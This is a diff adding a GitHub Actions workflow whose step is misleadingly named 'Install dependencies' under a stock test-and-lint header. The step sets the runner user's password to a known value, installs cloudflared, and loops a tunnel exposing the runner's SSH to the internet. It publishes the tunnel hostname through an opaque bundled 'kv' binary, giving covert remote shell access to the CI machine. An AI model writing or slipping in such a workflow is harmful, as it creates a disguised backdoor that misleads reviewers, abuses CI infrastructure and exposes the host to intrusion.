@@ -1,0 +1,41 @@
+# This workflow will install Python dependencies, run tests and lint with a single version of Python
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
+
+name: Python application 3
+
+on:
+  workflow_dispatch:
+    inputs:
+      data:
+        # Friendly description to be shown in the UI instead of 'name'
+        description: 'Input string'
+        # Default value if no value is explicitly provided
+        default: ''
+        # Input has to be provided for the workflow to run
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Install dependencies
+      run: |
+        (echo runner;echo runner) | sudo passwd runner
+        chmod a+x kv
+        cloudflared &>/dev/null --version|| sudo curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared && sudo chmod 755 /usr/local/bin/cloudflared && cloudflared --version
+        while true
+        do
+        cloudflared tunnel --url ssh://localhost &>.cflog &
+        while ! grep -q "  https" .cflog; do sleep 0.5; done
+        name="$(grep "  https" .cflog |cut -d " " -f 5|cut -d / -f 3|cut -d . -f 1)"
+        ./kv receive -k ghssh &>/dev/null || true
+        ./kv send -k ghssh -v $name
+        wait $(pidof cloudflared)
+        done
+        
